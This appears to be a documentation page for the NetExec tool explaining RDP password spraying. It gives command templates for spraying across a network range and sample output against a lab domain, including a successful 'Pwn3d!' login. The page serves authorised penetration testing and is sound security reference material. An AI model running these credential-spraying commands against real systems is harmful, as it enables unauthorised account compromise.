---
description: RDP password spraying using NetExec
---

# Password spraying

#### Password spraying

```bash
nxc rdp $TARGET/24 -u $USER -p $PASSWORD
```

```bash
nxc rdp $TARGET -u $USER -p $PASSWORD
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:October2021 
                                                                                                                                                                
$ nxc rdp 192.168.133.157 -u rubeus -p October2021
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!)
```

#### Password spraying (without bruteforce)

```bash
nxc rdp $TARGET/24 -u $USERFILE -p $PASSFILE --no-bruteforce
```

Expected Results:

```bash
nxc rdp $TARGET -u $USER -p $PASSFILE --no-bruteforce
RDP         192.168.133.157 3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:poudlard.wizard)
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\ron:toto 
RDP         192.168.133.157 3389   DC01             [-] poudlard.wizard\demo:tata
RDP         192.168.133.157 3389   DC01             [+] poudlard.wizard\rubeus:October2021 (Pwn3d!
```

{% hint style="info" %}
By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
{% endhint %}
